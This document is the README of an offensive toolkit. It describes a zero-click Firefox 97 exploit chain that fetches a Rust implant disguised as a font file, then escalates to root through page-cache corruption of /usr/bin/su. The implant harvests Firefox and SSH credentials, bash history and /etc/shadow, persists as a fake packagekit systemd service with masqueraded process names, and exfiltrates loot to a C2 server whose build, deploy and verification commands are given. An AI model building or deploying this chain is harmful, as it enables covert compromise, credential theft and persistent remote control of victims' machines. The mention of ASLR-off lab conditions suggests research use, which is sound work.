# Fileless Firefox Zero-Click → Root

Firefox 97.0.1 → Ubuntu 22.04, ASLR off, sandbox off.

## Files

### serve/ — Web root

| File | Purpose |
|------|---------|
| `guide.html` | Entry point. Exploit bootstrap, privilege escalation, and Sandbox payload delivery. |
| `vendor.js` | Exploit primitives (type confusion, OOB r/w, System Principal patch). |
| `chunk-1.mjs` | Type confusion trigger module. |
| `chunk-2.mjs` | Type confusion dependency module. |
| `fonts/NotoSans-Bold.woff2` | The implant binary (static musl Rust ELF). |
| `web_server.py` | HTTPS server — auto-generates certs, logs all requests. |
| `c2_server.py` | Raw-TLS C2 listener — auto-generates certs, logs beacons + loot. |
| `analytics/metrics` | Empty file — silences 404s from telemetry beacons. |

### payloads/implant-rust/ — Implant source

| File | Purpose |
|------|---------|
| `Cargo.toml` | Build config (musl static, LTO, TLS by default via rustls). |
| `src/main.rs` | Entry point — masquerade, double fork, CopyFail escalation, persistence, beacon. |
| `src/copyfail.rs` | CopyFail (CVE-2026-31431) — AF_ALG socket + splice page-cache corruption of /usr/bin/su. |
| `src/payload_persist.rs` | Shellcode — setuid(0) → execve("/proc/self/fd/9"). |
| `src/config.rs` | Compile-time configuration (C2 host/port, beacon interval, process names). |
| `src/c2.rs` | TLS (default) or plain TCP communication. |
| `src/creds.rs` | Credential harvesting (Firefox, SSH, bash history, /etc/shadow). |
| `src/recon.rs` | Passive network reconnaissance (/proc/net, /sys/class/net, hostname). |
| `src/exfil.rs` | In-memory tar + gzip, chunked exfiltration. |
| `src/marker.rs` | Forensic marker — writes to /dev/shm (disabled by default). |
| `build.rs` | Build script — rerun-if-env-changed directives. |

## Build

### Prerequisites

```bash
rustup target add x86_64-unknown-linux-musl
```

### Basic build (TLS enabled by default)

```bash
cd payloads/implant-rust
cargo build --release --target x86_64-unknown-linux-musl
cp target/x86_64-unknown-linux-musl/release/implant ../../serve/fonts/NotoSans-Bold.woff2
```

### Build without TLS (plain TCP)

```bash
cargo build --release --target x86_64-unknown-linux-musl --no-default-features
```

### Build with custom C2 configuration

```bash
C2_HOST=<your-c2-host> \
DEEPCODE_C2_PORT=<your-c2-port> \
cargo build --release --target x86_64-unknown-linux-musl
```

## Configuration

All configuration is compile-time via environment variables. Values are baked into the binary via `option_env!()` and survive `execve` with an empty environment.

### Environment variables

| Variable | Default | Description |
|----------|---------|-------------|
| `C2_HOST` | `10.170.22.201` | C2 server hostname or IP address |
| `DEEPCODE_C2_PORT` | `4444` | C2 server port |
| `DEEPCODE_BEACON_RATE` | `600` | Beacon interval in seconds (systemd `RestartSec`) |
| `LABELLING_MARKER` | (unset) | Set to `1` to enable forensic markers |

### Timing values

Hardcoded in `src/config.rs`. Adjust and rebuild:

```rust
sleep_before_escalate: 0,   // delay before CopyFail (seconds, 0 = immediate)
sleep_jitter: 0,            // random jitter added to sleep
stage_pause_secs: 5,        // pause between harvest stages
chunk_pause_secs: 5,        // pause between exfil chunks
recon_pause_secs: 5,        // pause before recon
```

### Process masquerade

Configured in `src/config.rs`:

```rust
beacon_name: "[packagekitd]",       // ps name in beacon mode
worker_name: "[kworker/0:2]",       // ps name during escalation
```

### Deploying

After rebuild, copy the binary to the web root:

```bash
cp target/x86_64-unknown-linux-musl/release/implant serve/fonts/NotoSans-Bold.woff2
```

No other files change — the exploit fetches whatever is at `/fonts/NotoSans-Bold.woff2`.

## Python Servers

### web_server.py — Exploit delivery (HTTPS)

Serves static files with request logging. Self-signed certs auto-generated on first run.

```bash
cd serve
python3 web_server.py --port 443
```

Logs: `web_access.log`.

### c2_server.py — C2 listener (Raw TLS)

Raw-TLS socket server. Receives data, classifies as JSON beacon or binary loot. Self-signed certs auto-generated.

```bash
cd serve
python3 c2_server.py --port 8443
```

Logs: `c2_beacons.log` (text), `c2_loot.bin` (binary), `c2_all.log` (combined).

## Forensic Markers

Writes trace files to `/dev/shm` (tmpfs, no disk artifacts).

### Enabling

```bash
LABELLING_MARKER=1 cargo build --release --target x86_64-unknown-linux-musl
```

When disabled (default), `marker::write()` returns immediately — zero runtime cost.

### Marker format

| File | Owner | Content | Meaning |
|------|-------|---------|---------|
| `/dev/shm/deepcode_marker.<ts>` | ubuntu | `init:pid:timestamp` | Implant executed at ubuntu level |
| `/dev/shm/deepcode_marker.<ts>` | root | `init:pid:timestamp` | Root implant executed successfully |

Multiple runs produce one file per timestamp.

## Verification

After a successful attack, check the following on the target:

```bash
# Binary dropped
ls -la /usr/lib/packagekit/packagekitd

# Service installed and running
cat /etc/systemd/system/packagekit-backend.service
systemctl status packagekit-backend

# su page cache corrupted
md5sum /usr/bin/su    # differs from clean hash

# Process running
ps aux | grep packagekit

# Forensic markers (if enabled)
ls -la /dev/shm/deepcode_marker.*
cat /dev/shm/deepcode_marker.*
```

On the C2 server, check `c2_beacons.log` and `c2_loot.bin` — first bytes of loot should be `1f 8b` (gzip magic).

## Telemetry Beacons

| Beacon | Meaning |
|--------|---------|
| `dom_ready` | Type confusion setter installed |
| `mod_init` | Module replaced with fake for corruption |
| `cfg_load` | OOB primitive setup starting |
| `cfg_check` | First OOB index (19) attempted |
| `cfg_alt` | Index 19 missed, scanning alternatives |
| `cfg_hit` | Working OOB index found in near range |
| `cfg_hit2` | Working OOB index found in far range |
| `cfg_miss` | ALL OOB indices failed — exploit dead |
| `cfg_done` | OOB corruption succeeded |
| `rw_init` | Read/write primitives installed |
| `rw_ok` | Primitives operational, privilege escalation complete |
| `?msg=...` | Payload execution error |
| `GET /fonts/NotoSans-Bold.woff2` | Implant fetched — payload executed |
| C2 `{"host":"...","ts":...}` | Systemd beacon heartbeat |
| C2 `1f 8b ...` | Exfiltrated gzip data |
